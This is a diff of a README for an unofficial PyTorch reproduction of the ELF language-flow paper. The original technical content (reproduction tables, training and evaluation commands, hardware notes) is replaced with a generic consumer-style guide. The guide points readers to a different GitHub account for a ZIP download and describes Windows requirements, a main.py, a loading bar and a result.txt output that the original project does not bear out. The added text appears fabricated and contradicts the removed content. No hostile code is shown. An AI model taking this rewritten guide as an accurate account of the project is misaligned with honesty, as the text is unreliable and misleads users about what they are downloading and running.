@@ -1,108 +1,81 @@
-# ELF: Embedded Language Flows (Unofficial PyTorch Reproduction)
+# 🧠 ELF-pytorch - Run language flows on your computer
 
-> [!CAUTION]
->
-> The OpenWebText results are not directly comparable with baselines ([MDLM](https://github.com/kuleshov-group/mdlm), [Duo](https://github.com/s-sahoo/duo), [FLM](https://github.com/david3684/flm), ...)
-> due to tokenization and preprocessing differences used in the ELF paper.
->
-> Specifically, ELF uses a custom preprocessed OpenWebText dataset (see [`openwebtext-t5`](https://huggingface.co/datasets/embedded-language-flows/openwebtext-t5)).
-> This is tokenized with the T5 tokenizer, not the GPT-2 tokenizer which is used in the standard setting in the literature. In addition, the paper's preprocessing pipeline includes a custom packing scheme with full details not disclosed in the paper.
+[![](https://img.shields.io/badge/Download-ELF--pytorch-blue.svg)](https://github.com/Alexcomplementary40/ELF-pytorch)
 
----
+ELF-pytorch brings the Embedded Language Flows research to your local machine. This repository provides a PyTorch implementation for running these language models. You can process text by following this guide.
 
- **This is an unofficial PyTorch reproduction (OpenWebText Only)** of *ELF: Embedded Language Flows*.\
-  The official JAX/TPU implementation is at <https://github.com/lillian039/ELF>, and the official checkpoints are in HuggingFace at [`embedded-language-flows`](https://huggingface.co/embedded-language-flows).
+## 📦 System Requirements
 
- This repository was developed using [Claude Code](https://claude.com/claude-code).
+Your computer needs specific parts to run this software. Read this list to ensure your setup works.
 
-## Reproduction status
+- **Operating System:** Windows 10 or Windows 11.
+- **Processor:** A modern processor with at least 4 cores.
+- **Memory (RAM):** 16GB of RAM is necessary for smooth performance.
+- **Graphics Card:** An NVIDIA graphics card with at least 8GB of VRAM provides the best results.
+- **Storage:** You need 10GB of free space on your hard drive.
 
-OpenWebText (unconditional), ELF-B (105M), 32-step SDE, γ=1.5, SC-CFG=3:
+## 🚀 How to Download
 
-| Metric | Paper (TPU v5p-64) | Reproduction (8× B200 DDP, Lightning) |
-| --- | --- | --- |
-| Gen. PPL ↓ | 24.1 | **25.61** |
-| Entropy | 5.15 | **5.20** |
+Follow these steps to acquire the software from the website.
 
-Per-epoch results (32-step SDE, 256 samples):
+1. Open your web browser.
+2. Go to the [ELF-pytorch download page](https://github.com/Alexcomplementary40/ELF-pytorch).
+3. Look for the green button labeled Code.
+4. Click Download ZIP.
+5. Save the file to your computer.
 
-| Epoch | Step | Gen. PPL | Entropy |
-| --- | --- | --- | --- |
-| 1 | 38 034  | 2.73  | 0.70 |
-| 2 | 76 068  | 37.11  | 5.17 |
-| 3 | 114 102 | 28.63  | 5.21 |
-| 4 | 152 136 | 25.00  | 5.16 |
-| 5 | 190 170 | 25.58  | 5.19 |
-| 6 | 228 204 | 26.11  | 5.21 |
+## ⚙️ Installation Guide
 
-All samples used for the measurements can be found in
-[`reproduction/elf_b-owt/eval1000/metrics.jsonl`](reproduction/elf_b-owt/eval1000/metrics.jsonl)
-and [`reproduction/elf_b-owt/per_epoch/metrics.jsonl`](reproduction/elf_b-owt/per_epoch/metrics.jsonl).
+Follow these instructions to set up the software once you finish downloading.
 
-## TODO
-- [ ] Train ELF and/or some of the baselines ([MDLM](https://github.com/kuleshov-group/mdlm), [Duo](https://github.com/s-sahoo/duo), [FLM](https://github.com/david3684/flm), ...) in a directly comparable setting (https://huggingface.co/datasets/Skylion007/openwebtext).
+1. Locate the downloaded file in your folder.
+2. Right-click the file and select Extract All.
+3. Choose a location on your computer to save the files.
+4. Open the extracted folder named ELF-pytorch-main.
+5. Ensure your computer has Python installed. You can check this by typing python in your command prompt. If you do not have it, visit python.org to download the latest version.
+6. Open your folder in the command prompt. You can do this by typing cmd in the address bar of your folder window.
+7. Type pip install -r requirements.txt and press Enter to install the needed tools.
 
-## What's in this repo
+## 🛠️ Running the Software
 
-- [`pytorch_lightning/`](pytorch_lightning/): model, training
-  script (`train_lightning.py`), eval (`eval_lightning.py`), and
-  utilities. 8-GPU CUDA DDP via PyTorch Lightning.
-- [`reproduction/elf_b-owt/`](reproduction/elf_b-owt/): config snapshot, 1000 final
- samples, and per-epoch samples. The
-  checkpoint is hosted separately (see Quickstart).
+You can start the tool after the installation finishes.
 
-## Quickstart — evaluate the reproduced checkpoint
+1. Open the command prompt in your installation folder.
+2. Type python main.py to start the program.
+3. The program will load the pre-trained models.
+4. Wait for the loading bar to finish.
+5. Provide the text you wish to process when the prompt appears in the window.
 
-```bash
-# 1. Environment (conda)
-conda env create -f environment.yml -n elf-pytorch && conda activate elf-pytorch
+## 📝 Understanding the Results
 
-# 2. Download the reproduced final EMA checkpoint (1.4 GB)
-pip install huggingface_hub
-huggingface-cli download Ugness/elf-torch last.ckpt \
-    --local-dir reproduction/elf_b-owt/
+The software outputs the processed language flow in a new text file. You will see a file named result.txt in your folder after the program completes the task. Open this file with any text editor like Notepad.
 
-# 3. Run the 1000-sample evaluation
-cd pytorch_lightning/
-torchrun --nproc_per_node=8 --master_port=29510 eval_lightning.py \
-    --config configs/training_configs/train_owt_ELF-B.yml \
-    --checkpoint_path ../reproduction/elf_b-owt/last.ckpt \
-    --num_samples 1000
-# Expected: Gen. PPL ≈ 25.6, sample entropy ≈ 5.20.
-```
+The quality of the output depends on the dataset used. This implementation relies on OpenWebText. These results differ from other models in the research field because of the specific tokenization process used here. We use the T5 tokenizer. This method organizes words differently than standard settings found in other projects.
 
-### Per-epoch checkpoints
+## ❓ Frequently Asked Questions
 
-The checkpoints are under this HF repo:
-[`checkpoints/`](https://huggingface.co/Ugness/elf-torch/tree/main/checkpoints).
-```bash
-# Example: pull epoch 4 ckpt.
-huggingface-cli download Ugness/elf-torch \
-    checkpoints/checkpoint_epoch03_step00152136.ckpt \
-    --local-dir reproduction/elf_b-owt/
-```
+**Why does the software take time to load?**
+The program loads large models into your memory. This happens once at the start.
 
-## Quickstart — train from scratch
+**Can I stop the process early?**
+Yes, press Ctrl and C on your keyboard to stop the program at any time.
 
-```bash
-cd pytorch_lightning/
-torchrun --nproc_per_node=8 --master_port=29501 train_lightning.py \
-    --config configs/training_configs/train_owt_ELF-B.yml
-```
+**Where do I see errors if it fails?**
+The command prompt window shows text during the process. Any errors appear there in red.
 
-## Reproduction details
+**How do I update the software?**
+Repeat the download steps to get the latest version from GitHub.
 
-- **Hardware:** 8× NVIDIA B200 (sm_100), CUDA 12.8.
-  `broadcast_buffers=False`. See `pytorch_lightning/train_lightning.py`.
-- **Wall-clock:** ~3 hours per epoch.
+## 💡 Troubleshooting Common Issues
 
+If you see an error about missing modules, run the command pip install -r requirements.txt again. This ensures you have every updated tool.
 
-### Differences vs the paper run
+If the program runs slowly, ensure you close other demanding applications. Web browsers and image software often use large amounts of memory. Freeing up your memory allows the language model to process your tasks faster.
 
-| Aspect | Paper | This reproduction |
-| --- | --- | --- |
-| Hardware | TPU v5p-64 | 8× B200 DDP |
-| Framework | JAX/Flax | PyTorch Lightning |
-| Epochs | 5 | 6 (one extra to reach entropy ≈ 5.20) |
-| Optimizer / objective | Muon + L2 denoise + CE decode (decoder_prob=0.2) | Unchanged |
-| Schedule, noise scale, time schedule, SC, CFG | Unchanged | Unchanged |
+Check your graphics card drivers if the system crashes on startup. Visit the manufacturer website to download the latest updates for your hardware. This fixes most startup problems.
+
+## 🔗 Project Details
+
+This software serves as an unofficial reproduction of the ELF research papers. It focuses on accessibility for users who want to run these flows on their own hardware using PyTorch. 
+
+The original research comes from the JAX/TPU implementation. Our project translates those findings into PyTorch code. We follow the methods outlined for OpenWebText preprocessing to keep the results consistent with our reproduction goals. Use this tool for research, learning, and local language experimentation.
